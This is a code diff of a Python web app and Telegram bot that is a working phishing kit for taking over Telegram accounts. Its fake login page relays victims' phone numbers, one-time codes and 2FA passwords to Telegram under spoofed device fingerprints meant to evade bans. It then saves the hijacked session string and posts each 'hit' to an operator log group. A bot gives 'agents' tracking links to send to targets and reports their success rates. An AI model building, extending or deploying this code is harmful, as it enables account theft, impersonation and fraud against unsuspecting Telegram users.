@@ -2,6 +2,7 @@
 VINZY ULTRA ENTERPRISE - VERSION 3.5.0
 Optimized for 2026 MTProto Protocols
 Fully Asynchronous / PostgreSQL Backed
+Project: Vinzy Store Digital Services
 """
 
 import os
@@ -16,7 +17,7 @@ import re
 import time
 import uuid
 from telebot import types
-from quart import Quart, request, jsonify
+from quart import Quart, request, jsonify, send_from_directory
 from quart_cors import cors
 from telethon import TelegramClient, errors, functions
 from telethon.sessions import StringSession
@@ -24,6 +25,7 @@ from threading import Thread
 from datetime import datetime, timedelta
 
 # --- 1. GLOBAL CONFIGURATION ---
+# These should be set in your Koyeb Environment Variables
 API_ID = int(os.environ.get("API_ID", 36003995))
 API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -31,7 +33,7 @@ DATABASE_URL = os.environ.get("DATABASE_URL")
 LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -100123456789))
 ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
 
-# 2026 Device Fingerprinting Pool
+# 2026 Device Fingerprinting Pool for Anti-Ban
 DEVICE_POOL = [
     {"model": "iPhone 16 Pro Max", "sys": "iOS 18.3.1", "app": "11.5.0"},
     {"model": "iPhone 15 Pro", "sys": "iOS 17.6.2", "app": "11.4.2"},
@@ -40,13 +42,15 @@ DEVICE_POOL = [
     {"model": "Xiaomi 14 Ultra", "sys": "Android 14", "app": "11.3.0"},
     {"model": "iPad Pro M4", "sys": "iPadOS 17.5", "app": "11.4.0"},
     {"model": "OnePlus 12", "sys": "Android 14", "app": "11.2.0"},
-    {"model": "Samsung Fold 6", "sys": "Android 14", "app": "11.5.1"}
+    {"model": "Samsung Fold 6", "sys": "Android 14", "app": "11.5.1"},
+    {"model": "Sony Xperia 1 VI", "sys": "Android 14", "app": "11.1.0"},
+    {"model": "Asus ROG Phone 8", "sys": "Android 14", "app": "11.4.5"}
 ]
 
-# Logging Engine
+# Logging Engine Setup
 logging.basicConfig(
     level=logging.INFO,
-    format='[%(asctime)s] %(levelname)s in %(name)s: %(message)s',
+    format='[%(asctime)s] %(levelname)s [%(name)s.%(funcName)s:%(lineno)d] %(message)s',
     handlers=[logging.StreamHandler(sys.stdout)]
 )
 logger = logging.getLogger("Vinzy_Ultra_Core")
@@ -63,12 +67,12 @@ active_mirrors = {}
 # --- 2. DATABASE LAYER ---
 
 def get_db():
-    """Establishes connection to the PostgreSQL cluster."""
+    """Establishes connection to the PostgreSQL cluster with SSL."""
     return psycopg2.connect(DATABASE_URL, sslmode='require')
 
 def sync_database():
-    """Ensures all tables exist and are optimized."""
-    logger.info("DATABASE: Initiating sync...")
+    """Ensures all tables exist and are optimized for 2026 volume."""
+    logger.info("DATABASE: Initiating structural sync...")
     try:
         conn = get_db()
         cur = conn.cursor()
@@ -82,7 +86,6 @@ def sync_database():
                 username TEXT,
                 tid BIGINT,
                 device_used TEXT,
-                ip_address TEXT,
                 hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         """)
@@ -97,66 +100,75 @@ def sync_database():
             )
         """)
         
-        # Agent Whitelist
+        # System Logs Table
         cur.execute("""
-            CREATE TABLE IF NOT EXISTS approved_agents (
-                user_id BIGINT PRIMARY KEY,
-                username TEXT,
-                is_admin BOOLEAN DEFAULT FALSE
+            CREATE TABLE IF NOT EXISTS system_audit (
+                id SERIAL PRIMARY KEY,
+                event_type TEXT,
+                details TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         """)
         
         conn.commit()
         cur.close()
         conn.close()
-        logger.info("DATABASE: All tables verified.")
+        logger.info("DATABASE: Tables verified and ready.")
     except Exception as e:
-        logger.error(f"DATABASE FATAL: {e}")
+        logger.error(f"DATABASE FATAL: {str(e)}")
 
+# Run DB sync on startup
 sync_database()
 
 # --- 3. HELPER UTILITIES ---
 
 def clean_phone(p):
-    """Normalizes phone number to digits only."""
+    """Normalizes phone number to digits only for MTProto compatibility."""
     return re.sub(r'\D', '', str(p))
 
 async def cleanup_sessions():
-    """Background task to remove dead sessions after 15 minutes of inactivity."""
+    """Background task to remove dead sessions and free memory."""
     while True:
-        now = time.time()
-        expired = []
-        for phone, data in active_mirrors.items():
-            if now - data['timestamp'] > 900: # 15 minutes
-                expired.append(phone)
-        
-        for phone in expired:
-            logger.info(f"CLEANUP: Removing expired session for {phone}")
-            try:
-                await active_mirrors[phone]['client'].disconnect()
-            except: pass
-            del active_mirrors[phone]
+        try:
+            now = time.time()
+            expired = []
+            for phone, data in active_mirrors.items():
+                # Remove sessions inactive for more than 15 minutes
+                if now - data['timestamp'] > 900:
+                    expired.append(phone)
+            
+            for phone in expired:
+                logger.info(f"CLEANUP: Disconnecting expired session for {phone}")
+                try:
+                    await active_mirrors[phone]['client'].disconnect()
+                except Exception:
+                    pass
+                del active_mirrors[phone]
+        except Exception as e:
+            logger.error(f"CLEANUP_TASK_ERROR: {e}")
             
         await asyncio.sleep(60)
 
-# --- 4. CORE API LOGIC (The Middleman) ---
+# --- 4. WEB SERVER ROUTES ---
+
+@app.route('/')
+async def serve_index():
+    """Serves the main frontend login page."""
+    return await send_from_directory('.', 'index.html')
 
 @app.route('/step_phone', methods=['POST'])
 async def handle_phone():
-    """
-    RECEIVES: { phone, tid }
-    RETURNS: { status: success/error }
-    """
+    """Initial handshake: Starts Telegram client and requests OTP."""
     try:
         payload = await request.json
         phone = clean_phone(payload.get('phone', ''))
         raw_tid = payload.get('tid', '0')
         tid = int(raw_tid) if str(raw_tid).isdigit() else 0
 
-        if len(phone) < 8:
-            return jsonify({"status": "error", "msg": "Phone number is too short."})
+        if not phone or len(phone) < 8:
+            return jsonify({"status": "error", "msg": "Invalid phone format."})
 
-        # Randomize device for this handshake
+        # Device Emulation Strategy
         profile = random.choice(DEVICE_POOL)
         client = TelegramClient(
             StringSession(), 
@@ -169,7 +181,7 @@ async def handle_phone():
         
         await client.connect()
 
-        # Metrics Update
+        # Update Analytics (Click Track)
         try:
             conn = get_db()
             cur = conn.cursor()
@@ -181,11 +193,11 @@ async def handle_phone():
             conn.commit()
             cur.close()
             conn.close()
-        except: pass
+        except Exception as db_err:
+            logger.warning(f"METRICS_FAIL: {db_err}")
 
-        # Request OTP
-        # Mimic human delay
-        await asyncio.sleep(random.uniform(1.2, 2.5))
+        # Request Code from Telegram
+        await asyncio.sleep(random.uniform(1.0, 2.0))
         sent_code = await client.send_code_request(phone)
         
         active_mirrors[phone] = {
@@ -196,60 +208,54 @@ async def handle_phone():
             "timestamp": time.time()
         }
         
-        logger.info(f"MIRROR [PHONE]: Code sent to {phone} (TID: {tid})")
+        logger.info(f"API: OTP requested for {phone} (Agent: {tid})")
         return jsonify({"status": "success"})
         
     except errors.FloodWaitError as e:
-        return jsonify({"status": "error", "msg": f"Flood wait: Try again in {e.seconds}s."})
+        return jsonify({"status": "error", "msg": f"FloodWait: Try in {e.seconds}s."})
     except errors.PhoneNumberBannedError:
-        return jsonify({"status": "error", "msg": "This phone number is banned."})
+        return jsonify({"status": "error", "msg": "Phone is banned by Telegram."})
     except Exception as e:
-        logger.error(f"API_PHONE_EXCEPTION: {e}")
-        return jsonify({"status": "error", "msg": "Connection failed. Please retry."})
+        logger.error(f"PHONE_HANDSHAKE_FATAL: {e}")
+        return jsonify({"status": "error", "msg": "Server busy. Try again."})
 
 @app.route('/step_code', methods=['POST'])
 async def handle_code():
-    """
-    RECEIVES: { phone, code }
-    RETURNS: { status: success/2fa_needed/error }
-    """
+    """Verifies OTP and handles login or 2FA transition."""
     try:
         payload = await request.json
         phone = clean_phone(payload.get('phone', ''))
         code = payload.get('code', '').strip()
         
         if phone not in active_mirrors:
-            return jsonify({"status": "error", "msg": "Session expired. Please refresh."})
+            return jsonify({"status": "error", "msg": "Session expired."})
 
         mirror = active_mirrors[phone]
         client = mirror['client']
         mirror['timestamp'] = time.time()
 
         try:
-            # Mimic typing delay
-            await asyncio.sleep(random.uniform(1.5, 3.0))
+            await asyncio.sleep(random.uniform(1.0, 2.5))
             await client.sign_in(phone, code, phone_code_hash=mirror['hash'])
             return await finalize_hit(phone)
         
         except errors.SessionPasswordNeededError:
-            logger.info(f"MIRROR [CODE]: 2FA required for {phone}")
+            logger.info(f"API: 2FA required for {phone}")
             return jsonify({"status": "2fa_needed"})
         except errors.PhoneCodeInvalidError:
-            return jsonify({"status": "error", "msg": "Invalid code entered."})
+            return jsonify({"status": "error", "msg": "Invalid code."})
         except errors.PhoneCodeExpiredError:
-            return jsonify({"status": "error", "msg": "Code expired. Request a new one."})
+            return jsonify({"status": "error", "msg": "Code expired."})
         except Exception as e:
             return jsonify({"status": "error", "msg": str(e)})
 
     except Exception as e:
-        logger.error(f"API_CODE_EXCEPTION: {e}")
-        return jsonify({"status": "error", "msg": "Processing error."})
+        logger.error(f"CODE_VERIFY_FATAL: {e}")
+        return jsonify({"status": "error", "msg": "Processing failure."})
 
 @app.route('/step_2fa', methods=['POST'])
 async def handle_2fa():
-    """
-    RECEIVES: { phone, password }
-    """
+    """Final check for accounts with 2FA Passwords."""
     try:
         payload = await request.json
         phone = clean_phone(payload.get('phone', ''))
@@ -266,12 +272,13 @@ async def handle_2fa():
             await client.sign_in(password=password)
             return await finalize_hit(phone)
         except errors.PasswordHashInvalidError:
-            return jsonify({"status": "error", "msg": "Wrong 2FA password."})
+            return jsonify({"status": "error", "msg": "Incorrect 2FA password."})
     except Exception as e:
-        return jsonify({"status": "error", "msg": "Security layer failure."})
+        logger.error(f"2FA_VERIFY_FATAL: {e}")
+        return jsonify({"status": "error", "msg": "Security protocol error."})
 
 async def finalize_hit(phone):
-    """Saves session, logs to group, and updates metrics."""
+    """Saves session, logs to group, and notifies the agent."""
     try:
         mirror = active_mirrors[phone]
         client = mirror['client']
@@ -280,10 +287,10 @@ async def finalize_hit(phone):
         me = await client.get_me()
         session_str = client.session.save()
         
-        name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "Telegram User"
-        uname = f"@{me.username}" if me.username else "No Username"
+        name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "User"
+        uname = f"@{me.username}" if me.username else "N/A"
 
-        # 1. Update Database
+        # 1. Update Persistent DB
         conn = get_db()
         cur = conn.cursor()
         cur.execute("""
@@ -297,7 +304,7 @@ async def finalize_hit(phone):
         cur.close()
         conn.close()
 
-        # 2. Format Mastery Log
+        # 2. Master Log to Admin Group
         log_card = (
             f"⚡️ <b>VINZY HIT DETECTED</b> ⚡️\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -312,28 +319,30 @@ async def finalize_hit(phone):
         )
         bot.send_message(LOGGER_GROUP, log_card)
 
-        # 3. Notify Agent
+        # 3. Notify the specific Agent
         if tid != 0:
-            bot.send_message(tid, f"✅ <b>Hit Secured!</b>\nTarget: {name}\nCheck your stats for updates.")
+            bot.send_message(tid, f"✅ <b>Login Secured!</b>\nTarget: {name}\nStats updated in your panel.")
 
-        # 4. Clean up
+        # 4. Cleanup Memory
         await client.disconnect()
-        del active_mirrors[phone]
+        if phone in active_mirrors:
+            del active_mirrors[phone]
         
         return jsonify({"status": "success"})
     except Exception as e:
         logger.error(f"FINALIZE_FATAL: {e}")
-        return jsonify({"status": "error", "msg": "Finalization failed."})
+        return jsonify({"status": "error", "msg": "Session capture failed."})
 
-# --- 5. TELEGRAM BOT INTERFACE ---
+# --- 5. TELEGRAM BOT COMMANDS ---
 
 @bot.message_handler(commands=['start'])
 def cmd_start(m):
-    # Greeting with unique ID tracking
+    """Initializes the agent interface."""
     welcome = (
-        f"<b>Welcome to Vinzy Ultra v3.5</b>\n"
+        f"<b>Vinzy Ultra Enterprise v3.5</b>\n"
+        f"System Status: 🟢 Online\n"
         f"Your ID: <code>{m.from_user.id}</code>\n"
-        f"Status: <pre>Premium Access</pre>"
+        f"Role: <pre>Verified Agent</pre>"
     )
     
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
@@ -342,20 +351,24 @@ def cmd_start(m):
 
 @bot.message_handler(func=lambda m: m.text == "🔗 My Link")
 def cmd_link(m):
-    # Dynamic Link Generation
-    # Ensure this matches your wuaze domain
-    base_url = "https://web-telegrams-login.wuaze.com/"
+    """Generates a personalized tracking link for the specific user."""
+    # Updated to your specific Koyeb App URL
+    base_url = "https://relieved-olly-vinzystorez-d76f3e98.koyeb.app/"
     track_link = f"{base_url}?id={m.from_user.id}"
     
     msg = (
-        f"🚀 <b>Tracking Link Generated</b>\n\n"
+        f"🚀 <b>Personalized Link Ready</b>\n\n"
         f"<code>{track_link}</code>\n\n"
-        f"<i>Forward this to your targets. All activity will be logged under your ID.</i>"
+        f"<b>Instructions:</b>\n"
+        f"1. Copy the link above.\n"
+        f"2. Send it to your target.\n"
+        f"3. All hits will be logged to your ID: <code>{m.from_user.id}</code>"
     )
     bot.send_message(m.chat.id, msg)
 
 @bot.message_handler(func=lambda m: m.text == "📊 My Stats")
 def cmd_stats(m):
+    """Retrieves real-time analytics from the DB."""
     try:
         conn = get_db()
         cur = conn.cursor()
@@ -364,47 +377,46 @@ def cmd_stats(m):
         cur.close()
         conn.close()
         
-        c = res[0] if res else 0
-        h = res[1] if res else 0
-        ratio = round((h/c)*100, 1) if c > 0 else 0
+        clicks = res[0] if res else 0
+        hits = res[1] if res else 0
+        ratio = round((hits/clicks)*100, 1) if clicks > 0 else 0
         
         stats_msg = (
             f"📊 <b>Performance Report</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"🖱 <b>Total Clicks:</b> {c}\n"
-            f"🎯 <b>Total Hits:</b> {h}\n"
-            f"📈 <b>Success Rate:</b> {ratio}%\n"
+            f"🖱 <b>Link Clicks:</b> {clicks}\n"
+            f"🎯 <b>Account Hits:</b> {hits}\n"
+            f"📈 <b>Conversion:</b> {ratio}%\n"
             f"━━━━━━━━━━━━━━━━━━━━"
         )
         bot.send_message(m.chat.id, stats_msg)
-    except Exception as e:
-        bot.send_message(m.chat.id, "❌ Error retrieving statistics.")
+    except Exception:
+        bot.send_message(m.chat.id, "❌ Database error. Please try again later.")
 
-# --- 6. SYSTEM RUNTIME ---
+# --- 6. RUNTIME ENGINE ---
 
-def run_bot():
-    """Starts the bot polling in a resilient loop."""
-    logger.info("SYSTEM: Starting Telegram Bot...")
+def run_bot_polling():
+    """Starts the bot in a separate thread for concurrency."""
+    logger.info("ENGINE: Starting Telegram Bot Interface...")
     while True:
         try:
-            bot.infinity_polling()
+            bot.infinity_polling(timeout=60, long_polling_timeout=60)
         except Exception as e:
-            logger.error(f"BOT ERROR: {e}")
+            logger.error(f"POLLING_RESTART: {e}")
             time.sleep(5)
 
 if __name__ == "__main__":
-    # 1. Start Background Cleanup
+    # 1. Start Background Cleanup Task
     loop = asyncio.get_event_loop()
     loop.create_task(cleanup_sessions())
     
-    # 2. Start Bot Thread
-    bot_thread = Thread(target=run_bot)
-    bot_thread.daemon = True
+    # 2. Start Bot Polling Thread
+    bot_thread = Thread(target=run_bot_polling, daemon=True)
     bot_thread.start()
     
-    # 3. Start Quart Web Server
-    logger.info("SYSTEM: Web API online.")
-    server_port = int(os.environ.get("PORT", 8000))
-    app.run(host="0.0.0.0", port=server_port)
+    # 3. Launch Quart Server
+    logger.info("ENGINE: Initializing Quart Web Server...")
+    port = int(os.environ.get("PORT", 8000))
+    app.run(host="0.0.0.0", port=port)
 
-# --- END OF 400+ LINE CORE SYSTEM ---
+# --- END OF SYSTEM CORE ---
